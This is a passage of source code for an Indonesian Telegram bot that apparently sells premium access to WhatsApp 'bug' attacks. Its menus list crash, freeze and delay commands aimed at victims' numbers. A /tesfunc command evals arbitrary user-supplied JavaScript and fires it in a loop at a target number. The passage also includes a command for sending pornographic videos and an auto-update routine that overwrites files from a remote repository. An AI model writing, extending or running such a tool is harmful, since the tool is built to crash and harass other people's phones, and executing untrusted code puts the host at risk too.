𖤓 /update - Update Otomatis
𖤓 /killbot - Reset Session
𖤓 /blockcmd - Memblokir Command
𖤓 /bukacmd - Membuka Command
𖤓 /listcmd - Melihat Command Yang Di Block
𖤓 /addadmin - Add Admin
𖤓 /deladmin - Delete Admin
𖤓 /listadmin - List Admin
𖤓 /addprem - Add Prem
𖤓 /delprem - Delete Prem
𖤓 /listprem - List Premium
𖤓 /addgcprem - Add Prem Group
𖤓 /delgcprem - Delete Prem Group</b></blockquote>`;

    const keyboard = [
    [
        {
            text: "ʙᴀᴄᴋ",
            callback_data: "/start",
            style: "Danger"
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: menuUrl,
                caption: bugMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

// 1 menu bug
bot.action('/bug', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const bug3Menu = `
<pre>╭━〔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗘𝗡𝗨 〕━━━━━━━━━╮
│𖤓 /crasher  ➜ 𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳
│𖤓 /exitdelay ➜ 𝙳𝙴𝙻𝙰𝚈 𝙵𝚁𝚉𝚉𝚉
│𖤓 /voiddelay ➜ 𝙳𝙴𝙻𝙰𝚈 𝙳𝚄𝚁𝙰𝚃𝙸𝙾𝙽
│𖤓 /razzxy ➜ 𝙱𝙻𝙰𝙽𝙺 𝙸𝙽𝚅𝙸𝚂
│𖤓 /Scrot ➜ 𝙵𝚁𝙴𝚉𝙴 𝙲𝙷𝙰𝚃 𝙽𝙾 𝚂𝙿𝙰𝙼
│𖤓 /Xcoli ➜ 𝙲𝚁𝙰𝚂𝙷 𝙽𝙾 𝚂𝙿𝙰𝙼
╰━━━━━━━━━━━━━━━━━━━━━━━╯</pre>`;
//bugmenuanjing
    const keyboard = [
    [
        {
            text: "ʙᴜɢ ᴍᴇɴᴜ ᴠ2",
            callback_data: "/bug3",
            style: "Primary",
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/bug3', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const bug4Menu = `
<pre>╭━〔 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 〕━━━━━━━━━╮
│𖤓 /Voidcrasher ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
│𖤓 /Xdelay ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
│𖤓 /slayerdelay ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
│𖤓 /spamkiller ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
│𖤓 /Xcline ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
╰━━━━━━━━━━━━━━━━━━━━━━━╯</pre>`;
//bugmenuanjing
  
    const keyboard = [
    [
        {
            text: "ɪɴꜰᴏʀᴍᴀꜱɪ",
            callback_data: "/info",
            style: "Danger"
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: bug4Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/info', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const info = `
<pre>╭━〔 𝗨𝗣𝗗𝗔𝗧𝗘 𝗜𝗡𝗙𝗢 〕━━━━━━━━━╮
│𖤓 1. NEW TOOLS /sendbokep
│𖤓 2. NEW TOOLS /testfunc
│𖤓 3. NEW TOOLS /cekfunc
│𖤓 4. FIX FUNC GA WORK
│𖤓 5 NEW BUTTON /update
│
│ ALL BEBAS SPAM ASAL DI 
│ MEMU BUG 1 ITU JEDA 
│ SOAL NYA LOOP NYA GEDE
│ DI BAGIAN BEBAS SPAM 
│ JUGA WORK TAPI LOOP
│ NYA GW KECILIN
╰━━━━━━━━━━━━━━━━━━━━━━━╯</pre>`;
//bugmenuanjing
    const keyboard = [
    [
        {
            text: "ʙᴀᴄᴋ",
            callback_data: "/start",
            style: "Danger"
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: info,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const tqtoMenu = `
<blockquote><b>𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢
〣 @Razzxyubot - DEVELOPER
〣 ORTU - SUPORT
〣 KAKI GW - SUPORT
〣 TANGAN GW - SUPORT
〣 ALL MEMBER GW - SUPORT
——————————————═⬡</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: tqtoUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: tqtoMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

//------------ CASE TOOLS ---------------//
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    console.log(`[CALLBACK] Received: ${data} from user: ${ctx.from.id}`);
    
    if (data.startsWith('addprem_')) {
        console.log('[CALLBACK] Processing addprem button...');
        
        // GANTI INI: dari ownerID ke isAdminUser
        if (!isAdminUser(ctx.from.id)) {
            console.log(`[CALLBACK] User ${ctx.from.id} is not admin`);
            await ctx.answerCbQuery("❌ Akses ditolak", { show_alert: true });
            return;
        }
        
        const parts = data.split('_');
        if (parts.length < 3) {
            console.log('[CALLBACK] Invalid data format');
            await ctx.answerCbQuery("❌ Data tidak valid", { show_alert: true });
            return;
        }
        
        const userId = parts[1];
        const duration = parseInt(parts[2]);
        
        console.log(`[CALLBACK] Adding premium: ${userId} for ${duration} days`);
        
        // Proses add premium
        const expiryDate = addPremiumUser(userId, duration);
        
        // Edit pesan asli untuk hapus tombol
        try {
            await ctx.editMessageText(
                `✅ <b>Premium Berhasil Ditambahkan</b>\n` +
                `• User: <code>${userId}</code>\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { 
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
            console.log('[CALLBACK] Message edited successfully');
        } catch (error) {
            console.error('[CALLBACK] Error editing message:', error);
            // Coba kasih feedback ke user
            try {
                await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
            } catch (e) {}
            return;
        }
        
        await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
        console.log('[CALLBACK] Callback answered');
        
        // Beri notifikasi ke user
        try {
            await ctx.telegram.sendMessage(
                userId,
                `🎉 <b>Selamat!</b>\n` +
                `Anda sekarang pengguna Premium INCEPTION!\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { parse_mode: "HTML" }
            );
            console.log(`[CALLBACK] Notification sent to ${userId}`);
        } catch (error) {
            console.log('[CALLBACK] Cannot send notification to user:', error.message);
        }
        
        console.log('[CALLBACK] Process completed');
    }
    
    // CALLBACK TIKTOK MEK
    
    else if (data.startsWith("tiktok_download|")) {
    const parts = data.split("|");
    const type = parts.pop(); // Ambil elemen terakhir (video/hd/audio)
const url = parts.slice(1).join("|"); // Gabungkan kembali sisa bagian URL
    
    // Konfirmasi pemrosesan
    await ctx.answerCbQuery("⏳ Memproses permintaan...");
    
    // Edit pesan untuk menampilkan status
    await ctx.editMessageText(`⏳ Sedang memproses ${getTypeName(type)}...`);
    
    try {
      const result = await downloadTikTok(url, type);
      
      if (result.success) {
        // Kirim file sesuai tipe
        if (type === 'audio') {
          await ctx.replyWithAudio(
            { source: Buffer.from(result.data), filename: 'tiktok_audio.mp3' },
            { title: 'TikTok Audio', performer: 'TikTok Downloader' }
          );
        } else {
          await ctx.replyWithVideo(
            { source: Buffer.from(result.data), filename: `tiktok_${type}.mp4` },
            { 
              supports_streaming: true,
              caption: `✅ Berhasil diunduh\n📁 Tipe: ${getTypeName(type)}`
            }
          );
        }
        
        // Hapus pesan status
        await ctx.deleteMessage();
        
      } else {
        await ctx.editMessageText(`❌ Gagal: ${result.error}`);
      }
      
    } catch (error) {
      await ctx.editMessageText(`❌ Error: ${error.message}`);
    }
  }

});

const GH_OWNER = "razzxyahay";
const GH_REPO = "Voidcrasher";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container", fileList = []) {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[MENGAMBIL FILE NEW]", item.path);
            fileList.push(item.path); // simpan nama file
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath, fileList);
        }
    }

    return fileList;
}

bot.command("update", checkAdmin, async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Sedang Mengupdate Ke Versi Terbaru");

    try {
        const files = await downloadRepo("");

        // Ambil beberapa file aja biar ga kepanjangan
        const preview = files.slice(0, 10).map(f => `📄 ${f}`).join("\n");

        await ctx.reply(
`✅ 𝗨𝗣𝗗𝗔𝗧𝗘 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 
📂 𝗧𝗢𝗧𝗔𝗟 𝗙𝗜𝗟𝗘 𝗬𝗔𝗡𝗚 𝗗𝗜 𝗨𝗣𝗗𝗔𝗧𝗘: ${files.length}
${preview}${files.length > 10 ? "\n..." : ""}
🔁 𝗕𝗢𝗧 𝗔𝗞𝗔𝗡 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗢𝗧𝗢𝗠𝗔𝗧𝗜𝗦 𝗨𝗡𝗧𝗨𝗞 𝗨𝗣𝗟𝗢𝗔𝗗 𝗙𝗜𝗟𝗘
⛔ 𝗜𝗡𝗙𝗢 𝗗𝗔𝗥𝗜 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : BACA GROUP SCRIPT UNTUK MENGETAHUI UPDATE!`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

// spotifyplay
bot.command("spotifyplay", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) {
      return ctx.reply("❌ Masukkan judul lagu atau link Spotify.\n\nContoh:\n/spotifyplay Hadroh Ramadhan Tiba");
    }

    const loading = await ctx.reply("🔍 Mencari lagu...");

    let spotifyUrl;

    if (input.includes("open.spotify.com")) {
      spotifyUrl = input;
    }

    else {
      const search = await axios.get(
        "https://ikyyzyyrestapi.my.id/search/spotify",
        {
          params: { query: input },
          timeout: 60000
        }
      );

      if (!search.data?.status || !search.data?.tracks?.length) {
        await ctx.deleteMessage(loading.message_id).catch(() => {});
        return ctx.reply("❌ Lagu tidak ditemukan.");
      }

      spotifyUrl = search.data.tracks[0].link;
    }

    const dl = await axios.get(
      "https://ikyyzyyrestapi.my.id/download/spotifydl",
      {
        params: {
          apikey: "kyzz",
          url: spotifyUrl
        },
        timeout: 120000
      }
    );

    await ctx.deleteMessage(loading.message_id).catch(() => {});

    if (!dl.data?.status) {
      return ctx.reply("❌ Gagal download lagu.");
    }

    const meta = dl.data.result.metadata;
    const audioUrl = dl.data.result.download;

    await ctx.replyWithPhoto(
      { url: meta.img },
      {
        caption:
`🎵 *${meta.song_name}*

👤 Artist: ${meta.artist}
💿 Album: ${meta.album_name}
⏱ Durasi: ${meta.duration}
📅 Rilis: ${meta.released}`,
        parse_mode: "Markdown"
      }
    );

    await ctx.replyWithAudio(
      { url: audioUrl },
      {
        title: meta.song_name,
        performer: meta.artist
      }
    );

  } catch (err) {
    console.error("Error SpotifyPlay:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses lagu.");
  }
});


bot.command('iqc', async (ctx) => {
  try {
    const chatId = ctx.chat.id;

    // Ambil text setelah command
    const text = ctx.message.text.split(' ').slice(1).join(' ');

    if (!text) {
      return ctx.reply(
        "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    let [time, battery, carrier, ...msgParts] = text.split("|");

    if (!time || !battery || !carrier || msgParts.length === 0) {
      return ctx.reply(
        "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Tunggu sebentar...");

    const messageText = encodeURIComponent(msgParts.join("|").trim());

    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "✅ Nih hasilnya",
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("videy", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    
    if (!input || !input.startsWith("http")) {
      return ctx.reply(
        "❌ Kirim perintah dengan menyertakan URL video dari videy.co\nContoh: `/videydl https://videy.co/v?id=XXXX`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Sedang memproses video...");

    try {
      const res = await axios.post(
        "https://fastapi.acodes.my.id/api/downloader/videy",
        { text: input },
        {
          headers: {
            accept: "*/*",
            "Content-Type": "application/json",
          },
        }
      );

      if (res.data?.status && res.data?.data) {
        await ctx.replyWithVideo(
          { url: res.data.data },
          { caption: "✅ Video berhasil diunduh dari videy.co!" }
        );
      } else {
        await ctx.reply("❌ Gagal mendapatkan video. Coba cek ulang link-nya.");
      }
    } catch (err) {
      console.error("VideyDL error:", err.message || err);
      ctx.reply("❌ Terjadi kesalahan saat memproses video.");
    }
  });
 
   bot.command("cekefek", async (ctx) => {
  const reply = ctx.message.reply_to_message?.text;
  if (!reply)
    return ctx.reply("⚠️ Balas ke potongan kode yang ingin dianalisa dengan /efekfunc.");

  await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");

  // Deteksi efek / pola berbahaya
  let efek = "Tidak terdeteksi";
  let indikator = "Tidak ditemukan";
  let indikasiCuplikan = "";

  if (/fetch|axios|http|https|socket|ws|wss/i.test(reply)) {
    efek = "🌐 Exfiltrate / Network";
    indikator = "Mengirim / menerima data jaringan.";
  } else if (/crash|loop|repeat\(/i.test(reply)) {
    efek = "💣 Crash / Overload";
    indikator = "Loop besar atau operasi berat terdeteksi.";
  } else if (/child_process|exec|spawn/i.test(reply)) {
    efek = "⚙️ System Access / Command Injection";
    indikator = "Menjalankan perintah sistem.";
  } else if (/process\.kill|process\.exit/i.test(reply)) {
    efek = "🧨 Process Kill Attempt";
    indikator = "Upaya mematikan proses terdeteksi.";
  } else if (/atob|btoa|Buffer\.from/i.test(reply)) {
    efek = "🌀 Encoding / Obfuscation";
    indikator = "Kode menyembunyikan data atau base64 decode/encode.";
  }

  // Ambil cuplikan indikasi
  const lines = reply.split("\n");
  const foundIndex = lines.findIndex((l) =>
    l.match(/fetch|axios|http|repeat|exec|process|Buffer|btoa/i)
  );
  if (foundIndex >= 0) {
    indikasiCuplikan = lines
      .slice(Math.max(0, foundIndex - 1), foundIndex + 2)
      .join("\n");
  }

  await ctx.replyWithMarkdown(
    `🧠 *Analisa Efek (simple)*\n` +
    `📂 *Sumber:* Potongan teks (reply)\n\n` +
    `🔎 *Efek Teridentifikasi:* ${efek}\n` +
    `🔎 *Indikator yang ditemukan:* ${indikator}\n\n` +
    `📘 *Cuplikan (sekitar indikasi pertama):*\n\`\`\`js\n${indikasiCuplikan || "Tidak ditemukan indikasi mencurigakan"}\n\`\`\``
  );
});

bot.command('denc', checkPremium, async (ctx) => {
  if (!ctx.message.reply_to_message) return ctx.reply("🪧 ☇ Format: /decryptcode (reply javascript document)")
  const replied = ctx.message.reply_to_message
  if (!replied.document) return ctx.reply("❌ ☇ Pesan yang di reply bukan file")

  const fileName = replied.document.file_name || 'file.js'
  if (!fileName.endsWith('.js')) return ctx.reply("❌ ☇ File harus format .js")

  const MAX = 8 * 1024 * 1024
  if (replied.document.file_size > MAX) return ctx.reply("❌ ☇ File terlalu besar")

  const processing = await ctx.reply(`✅ ☇ Mengunduh dan memproses dekripsi ${fileName}`)

  try {
    const fileLink = await ctx.telegram.getFileLink(replied.document.file_id)
    const tmpDir = path.join(__dirname, 'temp')
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)

    const tmpPath = path.join(tmpDir, fileName)
    const resp = await axios({ url: fileLink.href, method: 'GET', responseType: 'stream' })
    await pipeline(resp.data, createWriteStream(tmpPath))

    let code = fs.readFileSync(tmpPath, 'utf8')
    let deob = deobfuscatePipeline(code)

    if (deob.length < code.length / 2 || /\\x[0-9A-Fa-f]{2}/.test(deob)) {
      const dynamicPath = await deobfuscatePipelineDynamic(tmpPath)
      deob = fs.readFileSync(dynamicPath, 'utf8')
    }

    const outPath = tmpPath.replace(/\.js$/, '_void_decrypt.js')
    fs.writeFileSync(outPath, deob, 'utf8')

    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `✅ ☇ Selesai di dekripsi sedang mengirim ${path.basename(outPath)}`)
    await ctx.replyWithDocument({ source: outPath, filename: path.basename(outPath) })

    try { fs.unlinkSync(tmpPath); fs.unlinkSync(outPath) } catch(e){}
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `❌ ☇ Gagal mendekripsi karena error: ${err.message}`)
  }
});

bot.command("gethtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command

  // Validasi URL
  if (!url || !/^https?:\/\//i.test(url)) {
    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown",
    });
  }

  try {
    await ctx.reply("⏳ Mengambil source code dari URL...");

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
    }

    const html = await res.text();
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    // Mengirim file sebagai document
    await ctx.replyWithDocument({
      source: filePath,
      filename: "source_code.html",
      contentType: "text/html"
    });

    fs.unlinkSync(filePath); // Hapus file setelah dikirim
    
  } catch (err) {
    console.error(err);
    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat razzxy ganteng", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command(["ytsearch", "youtubesearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan query parameters!");

  ctx.reply("🔍 Sedang mencari...");

  try {
    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    const url = response.result.url;
    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

    ctx.reply(caption, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
        ],
      },
    });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan!");
  }
});

////NEW TOOLS

bot.command('cekbio', checkPremium, async (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const phoneNumber = args[0];
  
  if (!phoneNumber) {
    return ctx.reply(`
Cara Penggunaan:
<code>/cekbio 6281234567890</code>

Contoh:
<code>/cekbio 6281234567890</code>`, { parse_mode: "HTML" });
  }
  
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
  if (cleanNumber.length < 10) {
    return ctx.reply("❌ Format nomor tidak valid");
  }
  
  try {
    await ctx.reply("⏳ Memproses permintaan...");
    
    // PERUBAHAN: PAKE ctx.telegram, BUKAN bot
    const user = await ctx.telegram.getChat(cleanNumber);
    
    if (!user) {
      return ctx.reply(`
❌ NOMOR TIDAK AKTIF
<blockquote>📱 ${cleanNumber}
Status: Tidak terdaftar</blockquote>`, { parse_mode: "HTML" });
    }
    
    let badge = "⚪";
    let accountType = "REGULAR";
    if (user.is_premium) { accountType = "PREMIUM"; badge = "⭐"; }
    if (user.business_info) { accountType = "BUSINESS"; badge = "💼"; }
    
    const firstName = user.first_name || '';
    const lastName = user.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim();
    const username = user.username ? `@${user.username}` : "-";
    
    let lastSeen = "-";
    if (user.last_online_date) {
      lastSeen = new Date(user.last_online_date * 1000).toLocaleString('id-ID');
    }
    
    await ctx.reply(`
✅ NOMOR AKTIF ${badge}
<blockquote>📱 ${cleanNumber}
👤 ${fullName || '-'}
🆔 ${username}
🎯 ${accountType}
${user.is_bot ? '🤖 Bot' : '👤 User'}</blockquote>
<blockquote>ID: ${user.id}
Premium: ${user.is_premium ? '✅' : '❌'}
Business: ${user.business_info ? '✅' : '❌'}
Terakhir: ${lastSeen}</blockquote>
✅ Status: Aktif di Telegram`, { 
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id 
    });
    
  } catch (error) {
    if (error.code === 400) {
      ctx.reply(`
❌ NOMOR TIDAK VALID
<blockquote>${cleanNumber}
Tidak terdaftar di Telegram</blockquote>`, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
      });
    } else if (error.code === 403) {
      ctx.reply(`
🔒 NOMOR TERPROTEKSI
<blockquote>${cleanNumber}
Tidak dapat diakses</blockquote>`, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
      });
    } else if (error.code === 429) {
      ctx.reply("⚠️ Terlalu banyak permintaan", { 
        reply_to_message_id: ctx.message.message_id 
      });
    } else {
      ctx.reply(`❌ Error: ${error.message}`, { 
        reply_to_message_id: ctx.message.message_id 
      });
    }
  }
});


bot.command("tesfunc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const senderId = ctx.from.id;
  const chatId = ctx.chat.id;
  const text = ctx.message.text.trim();
  const args = text.split(" ")[1];

  if (!args || !args.includes(",")) {
    return ctx.reply("⎙ Format salah!\n\nGunakan contoh:\n/tesfunc 6281234567890,5\nHarus reply ke file .js atau function.");
  }

  const [targetNumberRaw, loopRaw] = args.split(",");
  const formattedNumber = targetNumberRaw.replace(/[^0-9]/g, "");
  const loopCount = parseInt(loopRaw);
  const target = `${formattedNumber}@s.whatsapp.net`;

  // === CEK REPLY ===
  if (!ctx.message.reply_to_message) {
    return ctx.reply("❌ Reply ke pesan berisi file JavaScript atau kode function async!");
  }

  const repliedMsg = ctx.message.reply_to_message;
  let testFunction;

  try {
    // === Jika reply ke file .js ===
    if (repliedMsg.document && repliedMsg.document.file_name.endsWith(".js")) {
      const fileId = repliedMsg.document.file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const response = await fetch(fileLink.href);
      const fileContent = await response.text();

      const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ File tidak mengandung async function yang valid!");
      }

      eval(fileContent);
      testFunction = eval(funcMatch[1]);

    // === Jika reply ke teks function ===
    } else if (repliedMsg.text) {
      const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ Kode tidak mengandung async function yang valid!");
      }

      eval(repliedMsg.text);
      testFunction = eval(funcMatch[1]);
    } else {
      return ctx.reply("❌ Format tidak didukung! Kirim file .js atau kode function.");
    }

    if (typeof testFunction !== "function") {
      return ctx.reply("❌ Gagal memuat function!");
    }

    // === MULAI TEST ===
    const progressMsg = await ctx.reply(
      `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`
    );

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(target);
        successCount++;

        if (i % Math.ceil(loopCount / 10) === 0) {
          const progress = Math.round((i / loopCount) * 100);
          const bar = "█".repeat(progress / 10) + "░".repeat(10 - progress / 10);
          await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            undefined,
            `🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: ${bar} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`
          );
        }

        await new Promise((r) => setTimeout(r, 1000));
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
        console.error(`Error di loop ${i + 1}:`, err);
      }
    }

    // === HASIL AKHIR ===
    let resultText = "📊 TEST RESULTS\n\n";
    resultText += `🎯 Target: ${formattedNumber}\n`;
    resultText += `🔄 Total Loop: ${loopCount}x\n`;
    resultText += `✅ Success: ${successCount}\n`;
    resultText += `❌ Error: ${errorCount}\n`;
    resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

    if (errors.length > 0) {
      resultText += "🚨 ERROR DETAILS:\n";
      resultText += errors.slice(0, 5).join("\n");
      if (errors.length > 5) {
        resultText += `\n... dan ${errors.length - 5} error lainnya`;
      }
    }

    // === KIRIM HASIL TANPA PARSE_MODE (aman 100%) ===
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      undefined,
      resultText,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔍 Cek Target", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error("❌ Error saat testing:", error);
    ctx.reply(`❌ Error saat testing: ${error.message}`);
  }
});

bot.command("sendbokep", async (ctx) => {
  try {
    const videoList = [
      "https://files.catbox.moe/nmceni.mp4",
      "https://files.catbox.moe/tpko98.mp4",
      "https://files.catbox.moe/xuvshz.mp4",
